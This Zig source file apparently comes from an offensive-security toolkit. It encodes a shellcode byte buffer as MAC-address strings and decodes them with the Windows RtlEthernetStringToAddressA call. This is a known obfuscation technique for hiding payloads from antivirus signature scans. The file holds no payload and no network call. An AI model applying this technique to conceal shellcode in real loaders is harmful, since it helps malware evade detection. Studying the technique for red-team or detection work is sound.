const std = @import("std");
const win = @import("zigwin32").everything;
const assert = std.debug.assert;

const PSTR = win.PSTR;
const DL_EUI48 = win.DL_EUI48;

const RtlEthernetStringToAddressA = win.RtlEthernetStringToAddressA;

fn generateMac(allocator: std.mem.Allocator, a: u8, b: u8, c: u8, d: u8, e: u8, f: u8) ![:0]u8 {
    return std.fmt.allocPrintZ(allocator, "{X:0>2}-{X:0>2}-{X:0>2}-{X:0>2}-{X:0>2}-{X:0>2}", .{ a, b, c, d, e, f });
}

pub fn obfuscate(allocator: std.mem.Allocator, shell_code: []const u8) ![][:0]const u8 {
    assert(shell_code.len % 6 == 0);

    var mac_array = try std.ArrayList([:0]const u8).initCapacity(allocator, shell_code.len / 6);
    errdefer freeMacArray(allocator, mac_array.items);

    var i: usize = 0;
    while (i < shell_code.len) : (i += 6) {
        const mac = try generateMac(allocator, shell_code[i], shell_code[i + 1], shell_code[i + 2], shell_code[i + 3], shell_code[i + 4], shell_code[i + 5]);
        mac_array.appendAssumeCapacity(mac);
    }

    return mac_array.toOwnedSlice();
}

pub fn deobfuscate(allocator: std.mem.Allocator, mac_array: [][:0]const u8) ![]u8 {
    var shell_code = try std.ArrayList(u8).initCapacity(allocator, mac_array.len * 6);
    errdefer shell_code.deinit();

    for (mac_array) |mac| {
        var addr: DL_EUI48 = undefined;
        var terminator: ?PSTR = null;

        const status = RtlEthernetStringToAddressA(mac, &terminator, &addr);
        if (status != 0) {
            std.debug.print("MacDeobfuscation Failed With Error Code: {d}\n", .{status});
            return error.MacDeobfuscationFailed;
        }

        shell_code.appendSliceAssumeCapacity(&addr.Byte);
    }

    return shell_code.toOwnedSlice();
}

pub fn printMacArray(writer: anytype, mac_array: []const [:0]const u8) !void {
    try writer.writeAll("MAC Array: [");
    for (mac_array, 0..) |mac, i| {
        if (i > 0) try writer.writeAll(", ");
        try writer.print("\"{s}\"", .{mac});
    }
    try writer.writeAll("]\n");
}

pub fn freeMacArray(allocator: std.mem.Allocator, mac_array: [][:0]const u8) void {
    for (mac_array) |mac| allocator.free(mac);
    allocator.free(mac_array);
}
